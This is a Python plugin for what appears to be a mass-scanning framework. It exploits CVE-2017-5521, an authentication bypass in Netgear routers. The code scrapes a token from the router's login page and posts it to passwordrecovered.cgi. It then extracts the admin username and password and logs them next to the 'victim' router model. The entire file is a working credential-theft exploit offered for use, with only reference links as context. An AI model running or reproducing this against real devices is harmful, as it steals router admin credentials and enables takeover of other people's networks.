#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
*-----------------*
|CVE-2017-5521    |
*-----------------*

https://www.exploit-db.com/exploits/32883
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2017-5521-bypassing-authentication-on-netgear-routers/

"""
import requests
import logging as log
from .IPlugin import IPlugin, connection_type

def scrape(text, start_trig, end_trig):
	if text.find(start_trig) != -1:
		return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
	else:
		return None

class Plugin(IPlugin):
	def __init__(self):
		super().__init__()
		self.port = 80
		self.connection_type = connection_type.WEB
	def config(self):
		pass
	def exec(self, r):
		model = r.headers.get('WWW-Authenticate')
		if model is None:
			return
		token = scrape(r.text, 'unauth.cgi?id=', '\"')
		if token is None:
			return
		log.info("plugin=netgear token={} victim={}".format(token,model[13:-1]))
		url = r.url + 'passwordrecovered.cgi?id=' + token
		r = requests.post(url, verify=False)
		if r.text.find('left\">') != -1:
			username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
			username = scrape(username, '>', '\'')
			password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
			password = scrape(password, '>', '\'')
			if username is None:
				username = (scrape(r.text[r.text.find('left\">'):-1], 'left\">', '</td>'))
				password = (scrape(r.text[r.text.rfind('left\">'):-1], 'left\">', '</td>'))
		else:
			log.info("not vuln")
			return
		password = password.replace("&#35;","#")
		password = password.replace("&","&")
		log.info("plugin=netgear login={} password={} url={}".format(username, password, r.url))
